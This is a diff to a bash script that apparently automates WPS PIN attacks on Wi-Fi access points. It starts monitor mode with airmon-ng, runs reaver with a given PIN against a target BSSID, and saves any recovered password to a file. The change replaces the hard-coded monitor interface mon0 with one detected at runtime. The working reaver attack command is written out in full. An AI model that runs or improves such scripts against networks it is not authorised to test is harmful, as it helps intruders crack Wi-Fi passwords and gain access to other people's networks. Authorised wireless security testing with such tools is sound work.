@@ -17,6 +17,9 @@ fi
 clearBssid(){
     echo $1 | sed s/://g;
 }
+getMonitorName(){
+    ifconfig | perl -lane '{ if(/^[^\s]*mon/){ $_ =~ s/\s+.*//; print $_; } }'
+}
 
 TMP_FILE="/tmp/reCheckFoundPinTMP";
 TMP_ACTIVITY_FILE="/tmp/reCheckFoundPinACTIVITY";
@@ -26,9 +29,9 @@ BSSID=$2;
 BSSID_CLEAR=$(clearBssid $BSSID);
 CHANNEL_CMD="";
 WRITE_FOUND_PASS_TO=$CUR_DIR'/'$BSSID_CLEAR'_FOUND_PASSWORD.txt';
+MONITOR_NAME=$(getMonitorName);
 
-
-if [[ -z "$(ifconfig | grep mon0)" ]]; then
+if [[ -z "$(ifconfig | grep $MONITOR_NAME)" ]]; then
     airmon-ng start wlan0;
 fi
 
@@ -49,7 +52,7 @@ while true; do
       exit;
   fi
   sleep 2;
-  COMMAND="reaver -p $PIN -i mon0 -b $BSSID -vv -t 20 -g 1 -S -N $CHANNEL_CMD";
+  COMMAND="reaver -p $PIN -i $MONITOR_NAME -b $BSSID -vv -t 20 -g 1 -S -N $CHANNEL_CMD";
   echo $COMMAND;
   eval $COMMAND | perl -lane '
     if (/Received M3/){
